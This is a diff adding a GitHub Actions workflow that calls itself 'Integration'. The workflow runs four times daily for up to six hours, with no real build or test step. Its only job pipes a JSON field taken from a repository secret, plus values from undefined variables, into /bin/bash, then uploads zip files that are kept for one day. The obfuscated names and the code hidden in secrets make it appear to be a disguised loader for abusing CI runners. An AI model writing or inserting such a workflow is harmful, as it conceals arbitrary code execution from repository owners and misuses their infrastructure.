@@ -1,0 +1,29 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          on33147: ${{ secrets.on33147 }}
+        run: |
+          printf '%s' "$on33147" | jq -r .ujt96 | /bin/bash
+          echo $h4 | jq -r .abbq1886 | /bin/bash
+          printf '%s' "$gzvb28018" | jq -r .b68 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: WT76wCD1
+          path: "*.zip"
+          retention-days: 1
